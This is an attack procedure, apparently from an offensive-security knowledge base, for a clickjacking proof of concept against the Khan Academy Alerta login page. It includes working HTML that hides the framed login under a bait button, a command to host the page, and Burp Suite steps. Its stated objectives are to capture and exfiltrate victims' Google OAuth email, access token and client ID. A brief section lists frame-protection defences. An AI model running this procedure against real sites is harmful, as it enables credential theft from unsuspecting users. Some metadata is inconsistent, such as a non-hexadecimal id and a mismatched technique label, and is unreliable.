---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
name: Create-and-Execute-ClickJacking-PoC
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:28:05.298Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Credentials In Files]]'
sub_techniques: []
tags:
  - clickjacking
  - oauth
  - google
  - credentials-theft
commands: []
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: high
detection_risk: low
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Credentials In Files]]'
---

# Create-and-Execute-ClickJacking-PoC

## Summary

This procedure creates and executes a ClickJacking proof-of-concept targeting the Khan Academy Alerta login page at https://alerta.khanacademy.org/, exploiting the lack of frame protections to steal Google OAuth credentials from victims already logged into Google.

## Description

The attack involves crafting an HTML page that embeds the target login in an iframe, overlaying it with a deceptive UI element. When a logged-in victim interacts, the OAuth flow triggers an error message exposing sensitive data like email, access token, and client ID. This relies on the target's missing X-Frame-Options or CSP frame-ancestors, allowing iframe embedding, combined with verbose error handling in the OAuth process.

## Requirements

1. Access to [[tools/Burp-Suite]] for crafting the PoC
2. Victim with persistent Google authentication
3. Ability to host the malicious HTML page (e.g., local server or remote hosting)
4. Basic web development knowledge for HTML/JS iframe setup

## Defense

Defensive measures and detection strategies:

- Implement X-Frame-Options: DENY or SAMEORIGIN header on the login page
- Use Content-Security-Policy with frame-ancestors 'none' directive
- Sanitize error messages to avoid exposing OAuth tokens or user data
- Monitor for unusual iframe embeddings via web application firewall (WAF)

## Objectives

1. Embed the login page in an attacker-controlled iframe
2. Trick victim into triggering OAuth error
3. Capture and exfiltrate exposed credentials

## Instructions

### Step 1: Intercept and Analyze Target with Burp Suite

**Context**: Use Burp Suite to explore the login flow and confirm vulnerability to iframe embedding.

Launch Burp Suite proxy and browse to https://alerta.khanacademy.org/. Attempt a Google login to observe the error message exposing data.

**Technical Details**: No specific command; configure browser proxy to 127.0.0.1:8080 and intercept requests.

> Expected: See error popup with sample data like email and token when access is denied.

### Step 2: Craft the ClickJacking HTML PoC

**Context**: Create the iframe-based HTML to overlay the target page.

Develop clickjacked.html using a text editor or Burp's Repeater:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Innocuous Page</title>
  <style>
    iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; opacity: 0.1; }
    .bait { position: absolute; top: 50%; left: 50%; z-index: 1; }
  </style>
</head>
<body>
  <iframe src="https://alerta.khanacademy.org/"></iframe>
  <button class="bait">Click to Continue</button>
</body>
</html>
```

> Explanation: The iframe loads the login; low opacity hides it while the button overlays to trick clicks, initiating the OAuth attempt.

### Step 3: Host and Test the PoC

**Context**: Deploy the PoC and simulate victim interaction.

Host the file using a simple server, e.g., `python -m http.server 8000`, and access http://localhost:8000/clickjacked.html while logged into Google.

Trigger the click to see the error popup with credentials.

> Expected: Popup displays unauthorized access details including victim's email, token, and client ID for capture.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]
- [[Credentials In Files]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[clickjacking]]
- [[oauth]]
- [[google]]
- [[credentials-theft]]
